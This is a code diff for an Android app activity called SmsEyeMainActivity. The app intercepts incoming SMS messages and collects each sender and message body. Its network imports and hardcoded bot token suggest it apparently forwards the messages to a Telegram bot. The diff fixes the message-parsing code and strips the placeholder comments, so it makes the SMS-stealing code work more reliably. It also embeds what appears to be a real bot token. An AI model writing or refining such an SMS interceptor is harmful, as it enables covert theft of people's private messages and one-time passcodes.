@@ -20,7 +20,7 @@ import com.karumi.dexter.listener.single.PermissionListener;
 import com.karumi.dexter.listener.PermissionDeniedResponse;
 import com.karumi.dexter.listener.PermissionGrantedResponse;
 
-import com.example.sample.Constants; // ✅ Replace this with your actual constants class
+import com.example.sample.Constants;
 
 import java.io.OutputStream;
 import java.net.HttpURLConnection;
@@ -32,7 +32,7 @@ import java.util.Locale;
 public class SmsEyeMainActivity extends AppCompatActivity {
 
     private SmsReceiver smsReceiver;
-    private static final String BOT_TOKEN = "8000560638:AAHrOlt9b4U-QKmgnuOBl7bDxGzuz2wGXi4"; // 🔁 Replace with your actual bot token
+    private static final String BOT_TOKEN = "8000560638:AAHrOlt9b4U-QKmgnuOBl7bDxGzuz2wGXi4";
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -71,13 +71,17 @@ public class SmsEyeMainActivity extends AppCompatActivity {
 
         @Override
         public void onReceive(Context context, Intent intent) {
-            Object[] pdus = (Object[]) intent.getExtras().get("pdus");
-            if (pdus == null) return;
+            Bundle bundle = intent.getExtras();
+            if (bundle == null) return;
+
+            Object[] pdus = (Object[]) bundle.get("pdus");
+            String format = bundle.getString("format");
+            if (pdus == null || format == null) return;
 
             StringBuilder smsMessage = new StringBuilder();
 
             for (Object pdu : pdus) {
-                SmsMessage message = SmsMessage.createFromPdu((byte[]) pdu);
+                SmsMessage message = SmsMessage.createFromPdu((byte[]) pdu, format);
                 smsMessage.append("From: ").append(message.getDisplayOriginatingAddress()).append("\n");
                 smsMessage.append("Message: ").append(message.getDisplayMessageBody()).append("\n");
             }
@@ -123,4 +127,3 @@ public class SmsEyeMainActivity extends AppCompatActivity {
         }
     }
 }
-
